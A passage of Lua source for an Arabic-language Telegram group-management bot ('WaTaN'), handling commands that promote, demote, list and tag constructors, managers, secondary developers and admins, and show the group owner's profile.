if text == 'تحويل' and ChanSub(msg) and not database:get(bot_id..'WaTTTaN:change:WaTaN'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.audio_ then 
local mr = result.content_.audio_.audio_.persistent_id_
Addvoi(msg,msg.chat_id_,mr,msg.sender_user_id_..'.ogg')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'تحويل' and ChanSub(msg) and not database:get(bot_id..'WaTTTaN:change:WaTaN'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.sticker_ then 
local Str = result.content_.sticker_.sticker_.persistent_id_ 
Addjpg(msg,msg.chat_id_,Str,msg.sender_user_id_..'.jpg')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("مسح الاساسين") and ChanSub(msg) and CoSu(msg) then
database:del(bot_id..'Basic:Constructor'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n✯︙تم مسح المنشئين الاساسين')
return false
end
if text == 'المنشئين الاساسين' and ChanSub(msg) and CoSu(msg) then
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
t = "\n✯︙قائمة المنشئين الاساسين \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد منشئين اساسين"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("تاك للمنشئين الاساسين") and ChanSub(msg) or text == ("صيح المنشئين الاساسين") and ChanSub(msg) then
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
t = "\n✯︙وينكم تعالو يريدوكم بالكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد منشئين اساسين"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("رفع منشئ اساسي") and ChanSub(msg) and msg.reply_to_message_id_ and CoSu(msg) then
function start_function(extra, result, success)
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع منشئ اساسي @(.*)$") and ChanSub(msg) and CoSu(msg) then
local username = text:match("^رفع منشئ اساسي @(.*)$")
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته منشئ اساسي'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع منشئ اساسي (%d+)$") and ChanSub(msg) and CoSu(msg) then
local userid = text:match("^رفع منشئ اساسي (%d+)$") 
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم ترقيته منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل منشئ اساسي") and ChanSub(msg) and msg.reply_to_message_id_ and CoSu(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من الاساسيين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل منشئ اساسي @(.*)$") and ChanSub(msg) and CoSu(msg) then
local username = text:match("^تنزيل منشئ اساسي @(.*)$")
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من الاساسيين'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل منشئ اساسي (%d+)$") and ChanSub(msg) and CoSu(msg) then
local userid = text:match("^تنزيل منشئ اساسي (%d+)$") 
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من الاساسيين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم تنزيله من الاساسيين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'مسح المنشئين' and BasicConstructor(msg) and ChanSub(msg) then
database:del(bot_id..'Constructor'..msg.chat_id_)
texts = '✯︙تم مسح المنشئين '
send(msg.chat_id_, msg.id_, texts)
end

if text == ("المنشئين") and ChanSub(msg) and BasicConstructor(msg) then
local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
t = "\n✯︙قائمة المنشئين \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد منشئين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمنشئين") and ChanSub(msg) or text == ("صيح المنشئين") and ChanSub(msg) then
local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
t = "\n✯︙وينكم تعالو يريدوكم بالكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد منشئين"
end
send(msg.chat_id_, msg.id_, t)
end
if text ==("المنشئ") or text ==("المالك") then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
send(msg.chat_id_, msg.id_,"✯︙حساب المالك محذوف")
return false  
end
tdcli_function ({ID="GetUserProfilePhotos",user_id_=Manager_id,offset_=0,limit_=1},function(arg,getpro) 
if getpro.photos_[0] then
Text = "*✯︙Owner Name ↬ * ["..dp.first_name_.."](T.me/"..dp.username_..")\n*✯︙Owner User ↬* [@"..dp.username_.."]\n*✯︙Owner id ↬* ["..dp.id_.."](T.me/"..dp.username_..")"
keyboard = {} 
keyboard.inline_keyboard = {{{text=''..dp.first_name_..'',url="t.me/"..dp.username_ or WaTaNTeaM}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Text)..'&photo='..getpro.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
send(msg.chat_id_, msg.id_,Text,1, 'md')
end
end,nil)   
end,nil)   
end
end
end,nil)  
end
if text == "رفع منشئ" and ChanSub(msg) and msg.reply_to_message_id_ and BasicConstructor(msg) then
function start_function(extra, result, success)
database:sadd(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته منشئ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match("^رفع منشئ @(.*)$") and ChanSub(msg) and BasicConstructor(msg) then
local username = text:match("^رفع منشئ @(.*)$")
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Constructor'..msg.chat_id_, result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته منشئ'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("^رفع منشئ (%d+)$") and ChanSub(msg) and BasicConstructor(msg) then
local userid = text:match("^رفع منشئ (%d+)$")
database:sadd(bot_id..'Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته منشئ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم ترقيته منشئ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
if text and text:match("^تنزيل منشئ$") and ChanSub(msg) and msg.reply_to_message_id_ and BasicConstructor(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المنشئين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("^تنزيل منشئ @(.*)$") and ChanSub(msg) and BasicConstructor(msg) then
local username = text:match("^تنزيل منشئ @(.*)$")
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المنشئين'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("^تنزيل منشئ (%d+)$") and ChanSub(msg) and BasicConstructor(msg) then
local userid = text:match("^تنزيل منشئ (%d+)$")
database:srem(bot_id..'Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المنشئين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم تنزيله من المنشئين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'مسح المدراء' and Constructor(msg) then
database:del(bot_id..'Manager'..msg.chat_id_)
texts = '✯︙تم مسح المدراء '
send(msg.chat_id_, msg.id_, texts)
end
if text == ("المدراء") and ChanSub(msg) and Constructor(msg) then
local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
t = "\n✯︙قائمة المدراء \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد مدراء"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمدراء") and ChanSub(msg) or text == ("صيح المدراء") and ChanSub(msg) then
local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
t = "\n✯︙وينكم تعالو يريدوكم بالكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد مدراء"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع مدير") and ChanSub(msg) and msg.reply_to_message_id_ and Constructor(msg) then
function start_function(extra, result, success)
database:sadd(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته مدير'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^رفع مدير @(.*)$") and ChanSub(msg) and Constructor(msg) then
local username = text:match("^رفع مدير @(.*)$") 
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Manager'..msg.chat_id_, result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته مدير'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end 

if text and text:match("^رفع مدير (%d+)$") and ChanSub(msg) and Constructor(msg) then
local userid = text:match("^رفع مدير (%d+)$") 
database:sadd(bot_id..'Manager'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته مدير'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم ترقيته مدير'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end  
if text == ("تنزيل مدير") and ChanSub(msg) and msg.reply_to_message_id_ and Constructor(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير @(.*)$") and ChanSub(msg) and Constructor(msg) then
local username = text:match("^تنزيل مدير @(.*)$")
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المدراء'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير (%d+)$") and ChanSub(msg) and Constructor(msg) then
local userid = text:match("^تنزيل مدير (%d+)$") 
database:srem(bot_id..'Manager'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ ----- adddev2 sudog
if text == ("رفع مطور ثانوي") and ChanSub(msg) and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
function Function_WaTaN(extra, result, success)
database:sadd(bot_id.."Dev:WaTaN:2", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","✯︙تم ترقيته مطور ثانوي في البوت")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_WaTaN, nil)
return false 
end
if text and text:match("^رفع مطور ثانوي @(.*)$") and ChanSub(msg) and SudoBot(msg) then
local username = text:match("^رفع مطور ثانوي @(.*)$")
function Function_WaTaN(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id.."Dev:WaTaN:2", result.id_)
Reply_Status(msg,result.id_,"reply","✯︙تم ترقيته مطور ثانوي في البوت")  
else
send(msg.chat_id_, msg.id_,"✯︙لا يوجد حساب بهذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_WaTaN, nil)
return false 
end
if text and text:match("^رفع مطور ثانوي (%d+)$") and ChanSub(msg) and SudoBot(msg) then
local userid = text:match("^رفع مطور ثانوي (%d+)$")
database:sadd(bot_id.."Dev:WaTaN:2", userid)
Reply_Status(msg,userid,"reply","✯︙تم ترقيته مطور ثانوي في البوت")  
return false 
end
if text == ("تنزيل مطور ثانوي") and ChanSub(msg) and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
function Function_WaTaN(extra, result, success)
database:srem(bot_id.."Dev:WaTaN:2", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","✯︙تم تنزيله من المطور ثانويين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_WaTaN, nil)
return false 
end
if text and text:match("^تنزيل مطور ثانوي @(.*)$") and ChanSub(msg) and SudoBot(msg) then
local username = text:match("^تنزيل مطور ثانوي @(.*)$")
function Function_WaTaN(extra, result, success)
if result.id_ then
database:srem(bot_id.."Dev:WaTaN:2", result.id_)
Reply_Status(msg,result.id_,"reply","✯︙تم تنزيله من المطور ثانويين")  
else
send(msg.chat_id_, msg.id_,"✯︙لا يوجد حساب بهذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_WaTaN, nil)
return false
end  
if text and text:match("^تنزيل مطور ثانوي (%d+)$") and ChanSub(msg) and SudoBot(msg) then
local userid = text:match("^تنزيل مطور ثانوي (%d+)$")
database:srem(bot_id.."Dev:WaTaN:2", userid)
Reply_Status(msg,userid,"reply","✯︙تم تنزيله من المطور ثانويين")  
return false 
end
if text == ("الثانويين") and SudoBot(msg) then
local list = database:smembers(bot_id.."Dev:WaTaN:2")
t = "\n✯︙قائمة مطورين الثانويين للبوت \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "✯︙لا يوجد مطورين ثانويين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("مسح الثانويين") and ChanSub(msg) and SudoBot(msg) then
database:del(bot_id.."Dev:WaTaN:2")
send(msg.chat_id_, msg.id_, "\n✯︙تم مسح قائمة المطورين الثانويين  ")
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text ==("رفع الادمنيه") and Manager(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end
if num2 == 0 then
send(msg.chat_id_, msg.id_," ✯︙لا يوجد ادمنيه ليتم رفعهم") 
else
send(msg.chat_id_, msg.id_," ✯︙تمت ترقيه { "..num2.." } من الادمنيه") 
end
end,nil)   
end
if text == 'مسح الادمنيه' and ChanSub(msg) and Manager(msg) then
database:del(bot_id..'Mod:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✯︙تم مسح الادمنيه')
end
if text == ("الادمنيه") and ChanSub(msg) and Manager(msg) then
local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
t = "\n✯︙قائمة الادمنيه \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد ادمنيه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للادمنيه") and ChanSub(msg) or text == ("صيح الادمنيه") and ChanSub(msg) then
local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
t = "\n✯︙وينكم تعالو يريدوكم بالكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد ادمنيه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع ادمن") and ChanSub(msg) and msg.reply_to_message_id_ and Manager(msg) then
function start_function(extra, result, success)
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن @(.*)$") and ChanSub(msg) and Manager(msg) then
local username = text:match("^رفع ادمن @(.*)$")
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Mod:User'..msg.chat_id_, result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته ادمن'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن (%d+)$") and ChanSub(msg) and Manager(msg) then
local userid = text:match("^رفع ادمن (%d+)$")
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'Mod:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل ادمن") and ChanSub(msg) and msg.reply_to_message_id_ and Manager(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من الادمنيه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن @(.*)$") and ChanSub(msg) and Manager(msg) then
local username = text:match("^تنزيل ادمن @(.*)$") 
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من الادمنيه'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
